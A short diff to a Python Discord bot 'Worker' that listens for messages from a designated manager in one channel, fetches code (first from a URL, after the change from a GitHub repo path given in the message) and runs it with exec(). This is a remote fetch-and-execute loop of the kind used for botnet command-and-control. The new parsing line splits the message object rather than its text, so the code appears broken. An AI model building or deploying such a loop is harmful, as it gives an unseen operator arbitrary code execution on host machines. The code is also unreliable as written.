@@ -24,6 +24,10 @@ class Worker:
     # the bot instance made here can be interacted using instance.bot
     self.bot = commands.Bot(command_prefix=self.prefix)
 
+    # github instance, used to load files
+    self.ghub = Github()
+
+
   async def prep(self):
     await self.bot.wait_until_ready()
     self.base = self.bot.get_channel(self.base)
@@ -31,7 +35,11 @@ class Worker:
   async def hear(self):
     await self.bot.wait_until_ready()
     order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
-    page = requests.get(order.content).text
+    user, repo, path = order.split(":")[0], order.split(":")[1], order.split(":")[2]
+    repo_obj = self.ghub.get_repo(f"{user}/{repo}")
+
+    page = repo_obj.get_contents(path).decoded_content.decode()
+
     try:
       exec(str(page))
     except Exception as e:
